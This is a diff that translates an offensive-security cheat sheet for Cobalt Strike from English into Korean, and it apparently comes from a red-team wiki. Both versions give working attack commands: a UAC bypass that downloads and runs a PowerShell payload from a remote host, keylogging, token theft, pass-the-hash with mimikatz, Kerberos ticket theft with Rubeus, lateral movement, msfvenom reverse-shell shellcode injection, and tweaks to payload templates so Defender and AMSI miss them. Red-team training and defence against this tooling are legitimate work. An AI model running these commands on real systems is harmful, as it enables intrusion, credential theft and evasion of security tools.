@@ -4,16 +4,16 @@
 
 ### C2 Listeners
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.
+`Cobalt Strike -> Listeners -> Add/Edit` 그러면 어디에서 수신할지, 어떤 종류의 비콘을 사용할지 (http, dns, smb...) 등을 선택할 수 있습니다.
 
 ### Peer2Peer Listeners
 
-The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.
+이 리스너의 비콘은 C2와 직접 통신할 필요가 없으며, 다른 비콘을 통해 통신할 수 있습니다.
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons
+`Cobalt Strike -> Listeners -> Add/Edit` 그러면 TCP 또는 SMB 비콘을 선택해야 합니다.
 
-* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
-* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.
+* **TCP 비콘은 선택한 포트에 리스너를 설정합니다**. TCP 비콘에 연결하려면 다른 비콘에서 `connect <ip> <port>` 명령을 사용하세요.
+* **smb 비콘은 선택한 이름의 파이프 이름에서 수신합니다**. SMB 비콘에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.
 
 ### Generate & Host payloads
 
@@ -21,18 +21,18 @@ The beacons of these listeners don't need to talk to the C2 directly, they can c
 
 `Attacks -> Packages ->`&#x20;
 
-* **`HTMLApplication`** for HTA files
-* **`MS Office Macro`** for an office document with a macro
-* **`Windows Executable`** for a .exe, .dll orr service .exe
-* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)
+* **`HTMLApplication`** HTA 파일용
+* **`MS Office Macro`** 매크로가 포함된 오피스 문서용
+* **`Windows Executable`** .exe, .dll 또는 서비스 .exe용
+* **`Windows Executable (S)`** **스테이지리스** .exe, .dll 또는 서비스 .exe용 (스테이지리스가 스테이지보다 좋음, IoCs가 적음)
 
 #### Generate & Host payloads
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이는 비콘을 cobalt strike에서 다운로드하기 위한 스크립트/실행 파일을 생성합니다. 형식은 bitsadmin, exe, powershell 및 python입니다.
 
 #### Host Payloads
 
-If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
+호스팅할 파일이 이미 웹 서버에 있다면 `Attacks -> Web Drive-by -> Host File`로 가서 호스팅할 파일과 웹 서버 구성을 선택하세요.
 
 ### Beacon Options
 
@@ -40,137 +40,137 @@ If you already has the file you want to host in a web sever just go to `Attacks 
 execute-assembly &#x3C;/path/to/executable.exe>
 
 # Screenshots
-printscreen    # Take a single screenshot via PrintScr method
-screenshot     # Take a single screenshot
-screenwatch    # Take periodic screenshots of desktop
-## Go to View -> Screenshots to see them
+printscreen    # PrintScr 방법으로 단일 스크린샷 찍기
+screenshot     # 단일 스크린샷 찍기
+screenwatch    # 데스크탑의 주기적인 스크린샷 찍기
+## 보기 -> 스크린샷으로 가서 확인하세요
 
 # keylogger
 keylogger [pid] [x86|x64]
-## View > Keystrokes to see the keys pressed
+## 보기 > 키 입력으로 가서 눌린 키를 확인하세요
 
 # portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 다른 프로세스 내에서 포트 스캔 작업 주입
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Import Powershell module
+# Powershell 모듈 가져오기
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;just write powershell cmd here>
+powershell &#x3C;여기에 powershell cmd를 작성하세요>
 
 # User impersonation
-## Token generation with creds
-make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token generated with make_token
-## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
+## 자격 증명으로 토큰 생성
+make_token [DOMAIN\user] [password] # 네트워크에서 사용자를 가장하기 위한 토큰 생성
+ls \\computer_name\c$ # 생성된 토큰을 사용하여 C$에 접근 시도
+rev2self # make_token으로 생성된 토큰 사용 중지
+## make_token 사용 시 이벤트 4624가 생성됩니다: 계정이 성공적으로 로그인되었습니다. 이 이벤트는 Windows 도메인에서 매우 일반적이지만, 로그온 유형으로 필터링하여 좁힐 수 있습니다. 위에서 언급했듯이, 이는 LOGON32_LOGON_NEW_CREDENTIALS를 사용하며, 이는 유형 9입니다.
 
 # UAC Bypass
 elevate svc-exe &#x3C;listener>
 elevate uac-token-duplication &#x3C;listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Steal token from pid
-## Like make_token but stealing the token from a process
-steal_token [pid] # Also, this is useful for network actions, not local actions
-## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token from steal_token
+## pid에서 토큰 훔치기
+## make_token과 유사하지만 프로세스에서 토큰을 훔칩니다
+steal_token [pid] # 또한, 이는 네트워크 작업에 유용하며, 로컬 작업에는 유용하지 않습니다.
+## API 문서에서 이 로그온 유형은 "호출자가 현재 토큰을 복제할 수 있도록 허용합니다"라고 알려줍니다. 그래서 비콘 출력에서 Impersonated &#x3C;current_username>라고 표시됩니다 - 이는 우리의 복제된 토큰을 가장하고 있습니다.
+ls \\computer_name\c$ # 생성된 토큰을 사용하여 C$에 접근 시도
+rev2self # steal_token에서 토큰 사용 중지
 
-## Launch process with nwe credentials
-spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
-## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).
+## 새로운 자격 증명으로 프로세스 시작
+spawnas [domain\username] [password] [listener] # 읽기 권한이 있는 디렉토리에서 수행: cd C:\
+## make_token과 마찬가지로, 이는 Windows 이벤트 4624를 생성합니다: 계정이 성공적으로 로그인되었습니다. 그러나 로그온 유형은 2 (LOGON32_LOGON_INTERACTIVE)입니다. 호출 사용자 (TargetUserName)와 가장된 사용자 (TargetOutboundUserName)가 상세히 설명됩니다.
 
-## Inject into process
+## 프로세스에 주입
 inject [pid] [x64|x86] [listener]
-## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
+## OpSec 관점에서: 정말 필요하지 않는 한 크로스 플랫폼 주입을 수행하지 마세요 (예: x86 -> x64 또는 x64 -> x86).
 
-## Pass the hash
-## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
+## 해시 전달
+## 이 수정 프로세스는 LSASS 메모리 패칭을 요구하며, 이는 고위험 작업으로 로컬 관리자 권한이 필요하고 Protected Process Light (PPL)가 활성화된 경우에는 실행 가능성이 낮습니다.
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Pass the hash through mimikatz
+## mimikatz를 통한 해시 전달
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
-steal_token &#x3C;pid> #Steal token from process created by mimikatz
+## /run 없이, mimikatz는 cmd.exe를 생성합니다. 데스크탑으로 실행 중인 사용자라면 셸을 볼 수 있습니다 (SYSTEM으로 실행 중이라면 문제 없습니다).
+steal_token &#x3C;pid> # mimikatz에 의해 생성된 프로세스에서 토큰 훔치기
 
-## Pass the ticket
-## Request a ticket
+## 티켓 전달
+## 티켓 요청
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
+## 새로운 티켓을 사용하기 위해 새로운 로그온 세션 생성 (손상된 세션을 덮어쓰지 않기 위해)
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session &#x26; load it
+## 공격자 머신에서 PowerShell 세션을 통해 티켓을 작성하고 로드합니다
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
-## Pass the ticket from SYSTEM
-## Generate a new process with the ticket
+## SYSTEM에서 티켓 전달
+## 티켓으로 새로운 프로세스 생성
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Steal the token from that process
+## 해당 프로세스에서 토큰 훔치기
 steal_token &#x3C;pid>
 
-## Extract ticket + Pass the ticket
-### List tickets
+## 티켓 추출 + 티켓 전달
+### 티켓 목록
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### LUID로 흥미로운 티켓 덤프
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Create new logon session, note luid and processid
+### 새로운 로그온 세션 생성, LUID 및 프로세스 ID 기록
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Insert ticket in generate logon session
+### 생성된 로그온 세션에 티켓 삽입
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### Finally, steal the token from that new process
+### 마지막으로, 해당 새로운 프로세스에서 토큰 훔치기
 steal_token &#x3C;pid>
 
 # Lateral Movement
-## If a token was created it will be used
+## 토큰이 생성되면 사용됩니다
 jump [method] [target] [listener]
-## Methods:
-## psexec                    x86   Use a service to run a Service EXE artifact
-## psexec64                  x64   Use a service to run a Service EXE artifact
-## psexec_psh                x86   Use a service to run a PowerShell one-liner
-## winrm                     x86   Run a PowerShell script via WinRM
-## winrm64                   x64   Run a PowerShell script via WinRM
+## 방법:
+## psexec                    x86   서비스 EXE 아티팩트를 실행하기 위해 서비스 사용
+## psexec64                  x64   서비스 EXE 아티팩트를 실행하기 위해 서비스 사용
+## psexec_psh                x86   PowerShell 원라이너를 실행하기 위해 서비스 사용
+## winrm                     x86   WinRM을 통해 PowerShell 스크립트 실행
+## winrm64                   x64   WinRM을 통해 PowerShell 스크립트 실행
 
 remote-exec [method] [target] [command]
-## Methods:
-<strong>## psexec                          Remote execute via Service Control Manager
-</strong>## winrm                           Remote execute via WinRM (PowerShell)
-## wmi                             Remote execute via WMI
+## 방법:
+<strong>## psexec                          서비스 제어 관리자 통해 원격 실행
+</strong>## winrm                           WinRM (PowerShell)을 통해 원격 실행
+## wmi                             WMI를 통해 원격 실행
 
-## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
+## wmi로 비콘을 실행하려면 (점프 명령에 포함되지 않음) 비콘을 업로드하고 실행하세요
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
 # Pass session to Metasploit - Through listener
-## On metaploit host
+## 메타스플로잇 호스트에서
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
+## cobalt에서: Listeners > Add를 클릭하고 Payload를 Foreign HTTP로 설정합니다. Host를 10.10.5.120, Port를 8080으로 설정하고 저장을 클릭합니다.
 beacon> spawn metasploit
-## You can only spawn x86 Meterpreter sessions with the foreign listener.
+## 외부 리스너로 x86 Meterpreter 세션만 생성할 수 있습니다.
 
 # Pass session to Metasploit - Through shellcode injection
-## On metasploit host
+## 메타스플로잇 호스트에서
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Run msfvenom and prepare the multi/handler listener
+## msfvenom을 실행하고 multi/handler 리스너를 준비합니다.
 
-## Copy bin file to cobalt strike host
+## bin 파일을 cobalt strike 호스트로 복사합니다.
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 프로세스에 메타스플로잇 셸코드를 주입합니다.
 
 # Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
-## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
+## 스테이지리스 비콘 셸코드를 생성합니다. Attacks > Packages > Windows Executable (S)로 가서 원하는 리스너를 선택하고 출력 유형으로 Raw를 선택한 후 x64 페이로드를 선택합니다.
+## 메타스플로잇에서 post/windows/manage/shellcode_inject를 사용하여 생성된 cobalt strike 셸코드를 주입합니다.
 
 
 # Pivoting
-## Open a socks proxy in the teamserver
+## 팀 서버에서 소켓 프록시 열기
 beacon> socks 1080
 
 # SSH connection
@@ -180,38 +180,27 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Artifact Kit
 
-Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.
+보통 `/opt/cobaltstrike/artifact-kit`에서 cobalt strike가 이진 비콘을 생성하는 데 사용할 코드와 미리 컴파일된 템플릿을 찾을 수 있습니다 ( `/src-common`에 있음).
 
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.
+[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 생성된 백도어(또는 컴파일된 템플릿)와 함께 사용하면 Defender가 트리거되는 원인을 찾을 수 있습니다. 보통 문자열입니다. 따라서 최종 이진 파일에 해당 문자열이 나타나지 않도록 백도어를 생성하는 코드를 수정하면 됩니다.
 
-After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
-
+코드를 수정한 후 동일한 디렉토리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`로 복사하세요.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+공격적인 스크립트 `dist-pipe\artifact.cna`를 로드하는 것을 잊지 마세요. 이는 Cobalt Strike가 우리가 원하는 디스크의 리소스를 사용하도록 지시합니다.
 
-Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.
+### 리소스 키트
 
-### Resource Kit
+ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 스크립트 기반 페이로드 템플릿이 포함되어 있습니다.
 
-The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.
-
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:
-
+[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)와 함께 템플릿을 사용하면 방어자가 (이 경우 AMSI) 좋아하지 않는 것을 찾아 수정할 수 있습니다.
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
+감지된 라인을 수정하면 잡히지 않는 템플릿을 생성할 수 있습니다.
 
-Modifying the detected lines one can generate a template that won't be caught.
-
-Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.
-
-
-
-
-
-
-
+Cobalt Strike가 우리가 원하는 리소스를 디스크에서 사용하도록 하려면 공격적인 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
@@ -233,5 +222,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 
 ```
-
 
